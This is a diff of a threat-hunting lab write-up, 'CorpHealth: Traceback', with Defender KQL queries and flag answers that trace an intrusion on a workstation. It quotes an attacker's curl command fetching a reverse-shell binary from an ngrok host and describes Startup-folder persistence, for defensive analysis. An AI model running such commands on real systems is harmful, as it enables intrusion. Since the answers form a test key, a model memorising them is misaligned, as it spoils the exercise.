@@ -94,6 +94,27 @@ For example "Wells Fargo : wf-xxx-xxx01"  ch-ops-wks02
 
 
 
+CorpHealth: Traceback 
+Flag 0: Identify the device*
+Your first step is confirming which workstation generated the unusual telemetry.
+Initial log clustering shows that all suspicious events originated from a single endpoint active during an off-hours window in the middle of November.  
+During your initial sweep, look for a workstation that shows:
+A small cluster of events during an unusual maintenance window 
+Activity between Mid November to Early December.
+Multiple entries with sources tied to Process Events, Network Events,File Events and Script-based operations
+Hint: typical naming conventions for devices include abbreviating the company name as a prefix.
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-12-18T20:00:00))
+| where hourofday(TimeGenerated) < 6 or hourofday(TimeGenerated) >= 18
+| where InitiatingProcessCommandLine has_any ("cmd.exe", "powershell.exe")
+| summarize EventCount = count() by DeviceName
+| sort by EventCount desc
+For example "Wells Fargo : wf-xxx-xxx01"  ch-ops-wks02
+
+
+
+
+
 
 Flag 1: Unique Maintenance File*
 You’ve confirmed that  ch-ops-wks02   is the workstation of interest and narrowed your timeframe to the mid-November maintenance window.
@@ -372,18 +393,6 @@ Filter DeviceEvents where AdditionalFields contains either:
 "tokenChangeDescription"
 "Privileges were added"
 Recall the Flag 1 Script.
-Flag 14 — Privilege Token Modification  *
-You’ve traced the suspicious registry activity and the scheduled persistence artifacts back to the same PowerShell execution chain.
-But the attacker didn’t stop there.
-As you review deeper system events, something stands out:
-Windows recorded a ProcessPrimaryTokenModified event, a behavior consistent with attackers attempting to escalate privileges or adjust token integrity to blend in with SYSTEM-level processes.
-Your task now is to pinpoint which process actually performed that token modification.
-What is the "InitiatingProcessId" of the process whose token privileges were modified?
-Hint
-Filter DeviceEvents where AdditionalFields contains either:
-"tokenChangeDescription"
-"Privileges were added"
-Recall the Flag 1 Script.
 DeviceEvents
 | where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-26T20:00:00))
 | where DeviceName contains "CH-OPS-WKS02"
@@ -441,46 +450,222 @@ What URL did the workstation connect to when retrieving the file?
 Unresuscitating-donnette-smothery.ngrok-free.dev
 3.22.30.40:443
 "curl.exe" -o revshell.exe https://unresuscitating-donnette-smothery.ngrok-free.dev/revshell.exe
+Flag 18 — Execution of the Staged Unsigned Binary  *
+Shortly after the file was retrieved from the external tunnel, Defender recorded its execution on CH-OPS-WKS02. The binary did not originate from any trusted software distribution channel and was launched directly from the user’s profile directory. This execution event marks the attacker’s shift from staging to actively running their tooling. Your task is to determine which process executed the file.
+Which process executed the downloaded binary on CH-OPS-WKS02?
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-02T00:00:00) .. datetime(2025-12-04T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02"
+| where FolderPath contains @"start menu"
+| sort by TimeGenerated desc 
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\revshell.exe
+Explorer.exe
+2025-12-02T12:30:03.9096976Z
+Flag 19 — Identify the External IP Contacted by the Executable  *
+After execution on CH-OPS-WKS02, the downloaded binary attempted to initiate outbound communication to an external endpoint. Defender logged multiple failed TCP connection attempts to a remote IP on a high-nonstandard port. This traffic does not match any approved services and was initiated directly by the suspicious executable. Your task is to identify the external IP the process attempted to connect to.
+DeviceNetworkEvents
+| where TimeGenerated between (datetime(2025-12-02T00:00:00) .. datetime(2025-12-04T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02"
+| where InitiatingProcessCommandLine contains "revshell.exe" 
+| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessFolderPath, RemotePort, RemoteIP
+13.228.171.119:11746
+Flag 20 — Persistence via Startup Folder Placement  *
+After the downloaded binary executed and attempted outbound communication, Defender recorded another file event involving the same executable. The file was copied into a Windows Startup directory — a location frequently abused by attackers for simple persistence. Anything placed in this directory launches automatically at user logon. Your task is to identify the exact folder where the attacker attempted to establish persistence.
+Which folder path did the attacker use to establish persistence for the executable?
+Hints:
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-02T00:00:00) .. datetime(2025-12-04T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02"
+| where FolderPath contains @"start menu"
+| sort by TimeGenerated desc 
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\revshell.exe
+Flag 21 — Identify the Remote Session Source Device  *
+Several suspicious events — including file placement, network attempts, and execution — share the same remote session metadata. This indicates the attacker interacted with CH-OPS-WKS02 through a remote session rather than local physical access. Your first step is to identify the device name consistently listed as the remote session origin.
+DeviceLogonEvents
+| where TimeGenerated between (datetime(2025-11-20T00:00:00) .. datetime(2025-12-04T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02" 
+| where RemoteDeviceName != ""
+| sort by TimeGenerated desc 
+| project TimeGenerated, AccountName, ActionType, FailureReason, RemoteDeviceName ,InitiatingProcessRemoteSessionDeviceName
+对手
+Flag 22 — Identify the Remote Session IP Address  *
+The same remote session metadata attached to multiple suspicious events on CH-OPS-WKS02 includes a consistent originating IP address. This value represents the network source used by the adversary to interact with the system. Identifying this IP allows you to track the adversary’s entry point and correlate it with authentication logs, lateral movement, or external access patterns.
+What IP address appears as the source of the remote session tied to the attacker’s activity?
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-12-15T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02"
+| where isnotempty(InitiatingProcessRemoteSessionIP)
+| distinct InitiatingProcessRemoteSessionIP, ProcessRemoteSessionIP
+100.64.100.6
+2025-11-23T03:08:44.9950997Z
+Flag 23 — Identify the Internal Pivot Host Used by the Attacker  *
+The remote session metadata shows multiple IP addresses associated with the attacker’s activity. One of these addresses appears to be part of the internal Azure virtual network, suggesting the adversary either compromised another VM first or used an internal hop to reach CH-OPS-WKS02. Identifying this internal pivot point is essential to retracing the attacker’s route through the environment.
+Which internal IP address (non–100.64.x.x) appears as part of the attacker’s remote session metadata?
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-12-15T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02"
+| where isnotempty(InitiatingProcessRemoteSessionIP)
+| distinct InitiatingProcessRemoteSessionIP, ProcessRemoteSessionIP
+10.168.0.6
+Flag 24 — Identify the First Suspicious Logon Event  *
+To determine when the adversary first accessed the system, we need to look at the earliest logon event tied to their activity. This marks the true beginning of their presence on CH-OPS-WKS02. Multiple remote session IPs appear later in the attack timeline, but only one timestamp reflects the very first successful logon.
+What is the earliest timestamp showing a suspicious logon to CH-OPS-WKS02?
+(Answer should be just the timestamp.)
+DeviceLogonEvents
+| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-15T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02"
+| where RemoteDeviceName contains "对手"
+| where ActionType contains "LogonSuccess"
+2025-11-23T03:08:31.1849379Z
+Flag 25 — IP Address Used During the First Suspicious Logon  *
+After determining when the attacker first logged in, the next step is identifying where they logged in from. The earliest logon event provides a direct indicator of the attacker’s initial network origin. This IP represents the start of the intrusion path and will help narrow down whether the access came from another internal VM, a pivot device, or an external relay.
+What IP address is associated with the earliest suspicious logon timestamp?
+DeviceLogonEvents
+| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-15T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02"
+| where RemoteDeviceName contains "对手"
+| where ActionType contains "LogonSuccess"
+104.164.168.17
+Flag 26 — Account Used During the First Suspicious Logon  *
+Knowing the timestamp and IP of the initial suspicious logon allows us to pinpoint exactly which credentials the adversary leveraged to gain access. Identifying the compromised account is critical for understanding how the attacker authenticated and whether they used stolen credentials, a shared admin account, or a local user. Your task now is to determine which account was involved in that earliest logon event.
+Question:
+Which account name appears in the earliest suspicious logon event?
+DeviceLogonEvents
+| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-15T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02"
+| where RemoteDeviceName contains "对手"
+Chadmin
+Flag 27 — Determine the Attacker’s Geographic Region  *
+The suspicious remote device  authenticated into CH-OPS-WKS02 using several public IPs within a range. To understand where the attacker was operating from, analysts often enrich these IPs with geolocation data. Microsoft’s geo_info_from_ip_address() function allows you to derive country, region, and city information directly from KQL—no external OSINT tools required. Your task is to determine the attacker’s geographic origin using this enriched data.
+Question:
+According to Defender geolocation enrichment, what country or region do the attacker’s IPs originate from?
+print geo_info_from_ip_address("104.164.168.17")
+DeviceLogonEvents
+| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-15T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02"
+| where RemoteDeviceName contains "对手"
+| where ActionType contains "LogonSuccess"
+Vietnam
 
 
+Flag 28 — First Process Launched After the Attacker Logged In  *
+After establishing the attacker’s first login timestamp and origin IP, the next step is determining what they did immediately after gaining access. Defender records each new process execution along with its associated logon session, allowing analysts to trace the attacker’s first action on the system. This reveals whether the adversary began with exploration, privilege escalation, or immediate deployment of tools.
+Question:
+What was the first process launched by the attacker immediately after logging in?
+DeviceProcessEvents
+| where TimeGenerated > datetime(2025-11-23T03:08:31Z)
+| where TimeGenerated < datetime(2025-11-23T03:15:00Z)
+| where DeviceName contains "CH-OPS-WKS02"
+| where InitiatingProcessAccountName == "chadmin"
+| where InitiatingProcessFileName == "explorer.exe"
+| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName, ProcessId
+| sort by TimeGenerated asc
+| take 1
+Explorer.exe
+2025-11-23T03:08:52.8019171Z
 
 
+Flag 29 — Identify the First File the Attacker Accessed  *
+Once the attacker authenticated into the system, their very first action can reveal their priorities and objectives. Early file access is often a strong indicator of what the attacker was searching for — credentials, configuration data, operational details, or system weaknesses. By examining the earliest file opened within the session, you can identify exactly what they were after.
+What file did the attacker open first after the previous flag?
+DeviceFileEvents
+| where TimeGenerated > datetime(2025-11-23T03:09:00Z)
+| where TimeGenerated < datetime(2025-11-23T03:20:00Z)
+| where DeviceName contains "CH-OPS-WKS02"
+| where InitiatingProcessAccountName == "chadmin"
+| where InitiatingProcessFileName != "onedrivesetup.exe" 
+| project TimeGenerated, FileName, FolderPath, ActionType, InitiatingProcessFileName
+| sort by TimeGenerated asc
+2025-11-23T03:10:57.3530794Z
+CH-OPS-WKS02 user-pass.txt
+Flag 30 — Determine the Attacker’s Next Action After Reading the File  *
+After viewing the file, the attacker moved on to their next step in the intrusion chain. Early post-logon behavior often reveals operational intent — whether they used stolen credentials, attempted lateral movement, escalated privileges, or launched additional tooling. By examining process execution following the previous activity, analysts can determine how the attacker leveraged the information found in the file.
+Question:
+What did the attacker do next after reading the file?
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-23T00:00:00) .. datetime(2025-11-23T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02"
+| where InitiatingProcessCommandLine contains "powershell.exe"
+| where InitiatingProcessRemoteSessionDeviceName contains "对手"
+Ipconfig.exe
+2025-11-23T03:11:45.1631084Z
 
 
+Flag 31 — Identify the Next Account Accessed After Recon  *
+Following the attacker’s first round of local reconnaissance, the intrusion shifted from information-gathering to account-level interaction. This transition often marks the moment an adversary tests stolen credentials, pivots to a higher-value user profile, or begins lateral preparation. By analyzing logon activity immediately after the enumeration window, defenders can pinpoint which account the attacker chose to access next — a critical step in reconstructing intent and privilege escalation paths.
+Question:
+Which user account did the attacker access immediately after their initial enumeration activity?
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+DeviceLogonEvents
+| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-15T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02"
+| where AccountName contains "ops.maintenance"
+| where RemoteDeviceName contains "对手"
+| where ActionType contains "LogonSuccess"
+2025-11-23T03:30:27.5983652Z  LogonSuccess
+Logical Flow & Analyst Reasoning
+0 → 1 🔍
+A suspicious activity window is identified on CH-OPS-WKS02. Analysts anchor the starting point by validating host identity and establishing the timeframe of abnormal behavior.
+1 → 2 🔍
+Unusual maintenance activity and script execution stand out. Analysts question whether this was legitimate IT work or the beginning of attacker tooling.
+2 → 3 🔍
+Outbound connectivity attempts expose a nonstandard external destination. This raises concern that the script is beaconing rather than performing diagnostics.
+3 → 4 🔍
+Successful outbound traffic confirms a live connection. Analysts pivot to identify the destination and whether this aligns with corporate endpoints — it does not.
+4 → 5 🔍
+Disk activity follows shortly after beaconing. A new file appears, suggesting staging or tool transfer. Analysts catalog file properties and hashes.
+5 → 6 🔍
+Hash mismatch comparisons reveal differing versions of staged files. This raises suspicion of modification or deception during upload.
+6 → 7 🔍
+Additional staging artifacts appear in multiple directories. The attacker seems to be preparing the environment for future operations.
+7 → 8 🔍
+Registry queries indicate that the attacker is exploring credential or privilege-related keys. Analysts question whether escalation is being attempted.
+8 → 9 🔍
+Privilege manipulation events, including token modifications, confirm the attacker probed escalation pathways. This validates the earlier registry activity.
+9 → 10 🔍
+Shortly after escalation attempts, the attacker reaches out externally to download a new payload. This establishes the transition from recon to tool deployment.
+10 → 11 🔍
+Execution of the downloaded file marks a significant shift. Analysts inspect command-line arguments to determine purpose.
+11 → 12 🔍
+Network events reveal that the binary establishes outbound connectivity via an ngrok TCP tunnel. This confirms external control infrastructure.
+12 → 13 🔍
+Persistence emerges: the file is placed in the Startup folder. This ensures automatic execution on future logons and confirms foothold intent.
+13 → 14 🔍
+Analysts backtrack the origin of execution. Remote session metadata identifies the suspicious device name used for initial access.
+14 → 15 🔍
+That device name is tied to several internal IPs, hinting at pivoting or multiple session attempts. Analysts extract all related IPs for correlation.
+15 → 16 🔍
+Sorting by timestamp reveals which internal IP connected first. This establishes the earliest footprint inside the network.
+16 → 17 🔍
+Pivoting to logon events, analysts identify the earliest suspicious logon timestamp linked to the malicious device or IP.
+17 → 18 🔍
+The RemoteIP associated with the first logon reveals the attacker’s initial entry vector.
+18 → 19 🔍
+The corresponding account used during this logon surfaces the credentials the attacker leveraged to enter the environment.
+19 → 20 🔍
+Analysts correlate all accounts used across the attacker’s activity. This helps identify lateral movement or credential testing.
+20 → 21 🔍
+The first process launched immediately after logon exposes the attacker’s priority — reconnaissance, validation, or environment orientation.
+21 → 22 🔍
+Following that, the attacker opens a file containing credentials. Analysts understand this as targeted harvesting behavior.
+22 → 23 🔍
+The subsequent action reveals whether the attacker attempted to use those credentials or continued recon — showcasing tactical decision-making.
+23 → 24 🔍
+Events around remote IP geolocation help determine the attacker’s likely region or hosting provider, adding intelligence context.
+24 → 25 🔍
+Outbound HTTP/TCP attempts show whether the attacker established control channels beyond the ngrok tunnel.
+25 → 26 🔍
+Analysts review session lifecycles to identify active persistence channels and whether any were redundant or contingency mechanisms.
+26 → 27 🔍
+Registry-based Run keys or startup file placements point toward deliberate re-entry capability — the attacker prepared for repeated access.
+27 → 28 🔍
+Subtle cleanup behaviors appear. Analysts determine whether the attacker attempted to blend into system logs or overwrite artifacts.
+28 → 29 🔍
+File modification timestamps and process sequences help analysts reconstruct staging order and validate whether exfiltration occurred.
+29 → 30 🔍
+Outbound DNS or HTTP queries reveal whether the attacker validated external reachability for future exfil movements.
+30 → 31 🔍
+Analysts confirm whether compression or aggregation behavior occurred — attackers often bundle evidence before exfil attempts.
+31 → 32 🔍
+Finally, analysts correlate all elements — recon, credential access, payload deployment, persistence, and outbound C2 — closing out the narrative and reconstructing the full attack chain.
